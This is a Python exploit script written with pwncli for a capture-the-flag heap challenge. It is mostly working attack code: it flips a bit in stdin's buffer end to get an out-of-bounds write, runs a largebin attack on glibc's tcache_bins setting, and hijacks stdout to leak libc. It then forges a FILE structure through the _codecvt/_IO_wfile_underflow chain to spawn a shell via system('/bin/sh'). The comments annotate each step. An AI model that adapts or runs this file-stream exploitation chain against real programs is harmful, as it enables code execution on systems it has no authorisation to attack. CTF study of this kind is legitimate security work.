#!/usr/bin/env python3
# Date: 2024-12-11 15:00:47
# Link: https://github.com/RoderickChan/pwncli

## Ended up solving after the CTF
## Idea: We have a typical heap setup, are able to free and alloc (no show).
## We are also allowed to set one bit at a position in the stdin structure.
## Buffering is enabled, so heap will contain stdin/out/err output.
##
## We leverage this to set _IO_buf_end to be OOB, then leverage that to do largebin attack on the 
## mp_.tcache_bins in libc. This allows us to grab tcache chunks oob of the tcache, which we then 
## use to grab ptrs we partial overwrote to be stdout. Basically we grab stdout from the tcache.
##
## Resources:
## https://blog.kylebot.net/2022/10/22/angry-FSROP/
## https://github.com/5kuuk/CTF-writeups/tree/main/tfc-2024/mcguava
## 
## This script uses pwncli, https://github.com/RoderickChan/pwncli
## Used bata24's fork of gef, https://github.com/bata24/gef
##
## This file is a version of the same exploit using a different chain, namely the _codecvt chain.
## This is documented a bit below, and a great resource can be found here: https://niftic.ca/posts/fsop/#__libio_codecvt_in146.
## Its also used in the house of apple 3 :).

from pwncli import *

context.binary = './chal'
context.log_level = 'debug'
context.timeout = 5


gift.io = process('./chal', aslr=False)
# gift.io = remote('127.0.0.1', 13337)
gift.elf = ELF('./chal')
gift.libc = ELF('./libc.so.6')

io: tube = gift.io
elf: ELF = gift.elf
libc: ELF = gift.libc

# one_gadgets: list = get_current_one_gadget_from_libc(more=False)
# CurrentGadgets.set_find_area(find_in_elf=True, find_in_libc=False, do_initial=False)

def debug(gdbscript="", stop=False):
    if isinstance(io, process):
        gdb.attach(io, gdbscript=gdbscript)
        if stop:
            pause()

def cmd(i, prompt="> "):
    sla(prompt, i)

def add(idx, sz, data):
    cmd('1')
    cmd(str(idx))
    cmd(str(sz))
    cmd(data)
    #......

def dele(idx):
    cmd('2')
    cmd(str(idx))
    #......

def row(pos, bit):
    cmd('3')
    cmd(str(pos))
    cmd(str(bit))
    #......

## For some reason my libc was mapped before main binary, didnt make much of a diff but thats why ur seeing this weird ass base address.
## Breakpoints on relevant areas; mainly check on the __shlib_handle being null and the call of __fct
debug('''
      b * 0x155555302000 + 0x8ae94
      b _IO_wfile_underflow
      b *0x155555390049
      b *0x155555390092
      ''', stop=True)
## [0] Will have its size corrupted later by the stdout buffer, which lies above.
add(0, 0x28, b"ASDF")

## [1-1] Content of first big large chunk will have padding and fake sizes at the end, as 
## we plan on corrupting [0] to point into here.
cont = flat([
    ## First, fill with padding data. -0x40 to skip total size of [0] as we start writing bytes 0x40 bytes onward from 
    ## [0] , so no need to write xtra
    ##
    ##     0x40 bytes in total                 0x420-0x40 bytes in total          
    ##┌──────────────────────────────────┐┌──────────────────────────────────┐
    ##│[Header][Data....................]││[Header][Data....................]│
    ##└──────────────────────────────────┘└──────────────────────────────────┘
    ##
    b"C"*(0x420 - 0x40),
    ## Chunk [0] new size, (prev size). Unmasked since it will be free at this point.
    ## So no inuse bit.
    0x420,
    ## Need to actually have a chunk to have this prev_size, and then need to forge the 
    ## next chunk as well just to be sure
    0x21,
    ## Random data to fill the gap, chunk size is 0x20 so usable size is -8.
    b"\xff"*0x18,
    ## Now we can stop faking, this should line up with the next chunk after this
    ## which should be the next fence maybe?
    0x21
])
## [1] Will be used for largebin attack later on, among other things, see [1-1]
add(1, 0x428, cont)
## [~] Fences to stop top consuming em
add(3, 0x10, b"FENCE")
## [2] Same as [1].
add(2, 0x418, b"SL")
add(3, 0x10, b"FENCE")

## Put first lb chunk into unsorted bin
dele(1)

## Next, we wanna trigger the overflow using the bitflip on the _IO_buf_end
row(69, 5)

## Now accessing beyond 0x1000 in the stdin buf will overflow
overflower = flat([
    b"X"*0x1000,
    ## prev_size
    0,
    ## new [0] size, will point to the fake 0x20 chunks, which will in turn point to
    ## the last fence chunk at [3].
    0x420 | 1
])
## [1-2] Should flip over the chunk size now
add(3, 0x1108, overflower)

## Now we have overflowed, we wanna free our fake chunk so we can regain control over the area we overlapped
## at [1-2].
dele(0)

add(0, 0x38, "Z")
## Overwrite the BK to point to mp_.tcache_bins to allow us to bug tf out of the tcache.
## -0x20 cuz it'll add the metadata obv.
add(0, 0x38, b"A"*8 + p16(0x51e8 - 0x20))

## Now that we have tampered unsortedbin BK we need to trigger the attack.
## Free into unsortedbin
dele(2)
## Alloc a chunk too big for it, triggering insertion
add(2, 0x500, b"TST")
## Now using this we have OOB; we can request chunks lying outside the tcache bins, basically any pointer on the heap
## So: next thing is we need to leave some libc ptrs for us to use.
## 
## 1 in 16 this will be a ptr to stdout, since we overwrite the libc bin ptr.
add(2, 0x10, p16(0x65c0))
add(2, 0x10, p16(0x65c0))

## Now try to see if we can get a tcache
## This overwrites all ptrs up until the write base, then overwrites the lsb of write base which makes 
## it less than the end. This is one of the key things we need to trigger activity.
##
## Default ahh flags fake buffering on and other shiet so we printin shit.
stdout1 = flat([
    0xfbad1800,
    0,
    0,
    0,
])
stdout1 += b"\x00"
add(2, 0x2558, stdout1)
leak = u64(r(8))
libc.address = leak - 0x204644
print(f"[!] Leak: {hex(leak)}")
print(f"[!] Libc: {hex(libc.address)}")

rdi_0x10_rcx = 0x00000000001724f0#: add rdi, 0x10; jmp rcx;

## Now that we have leaks we can use the second stdout chunk to get rce innit.
fstruct = FileStructure()
fstruct.flags = 0x3b01010101010101
fstruct._IO_read_ptr = p64(libc.sym['system'])## rcx, this will be where we jump to
fstruct._IO_read_end = p64(libc.sym['system']+1) ## _IO_read_ptr has to be lt read end
## This what the initial call r12 will jump to, however we dont control contents of rdi yet, so must offset it with a gadget.
fstruct._IO_save_base = p64(libc.address + rdi_0x10_rcx)
fstruct._lock = libc.address + 0x205720

## Just some random area i found with a buncha NOTHIN so we dont null deref when checking
fstruct._wide_data = p64(libc.address + 0x205580)

## write_base overlaps perfectly with rdi, unfortunately this is where codecvt believes our __shlib_handle is, so we cant have anything here.
## write_ptr needs a value apparently
fstruct._IO_write_ptr = b"X"*8
fstruct._IO_write_end = b"/bin/sh\x00"
## Using a different chain this time; the codecvt method. Apparently used for character 
## conversions and stuff
##
## This will point the _codecvt over the top of __pad5 member
#/*    168      |       8 */    struct _IO_FILE *_freeres_list;
#/*    176      |       8 */    void *_freeres_buf;
#/*    184      |       8 */    size_t __pad5; <----
#/*    192      |       4 */    int _mode;
#/*    196      |      20 */    char _unused2[20];
fstruct._codecvt = p64(libc.sym["_IO_2_1_stdout_"] + 0xb8)
fstruct.unknown2 =  p64(0)*2 ## freeres list and buf
## __pad5, our new _IO_iconv_t->step
## Point this to a place where we can control a couple things, mainly need to control __fct and __shlib_handle
fstruct.unknown2 +=  p64(libc.sym["_IO_2_1_stdout_"] + 0x20)
## Set vtable, needs to be done this way for some reason or we dont set it at all, prolly to do with
## us messing with the unknown2 shit. Offsets so we can call _IO_wfile_underflow instead of puts thingy
## and set off the chain.
fstruct.unknown2 +=  p64(0)*3 ## freeres list and buf
fstruct.unknown2 +=  p64(libc.symbols['_IO_wfile_jumps'] - 0x18)

add(2, 0x2598, bytes(fstruct))


ia()
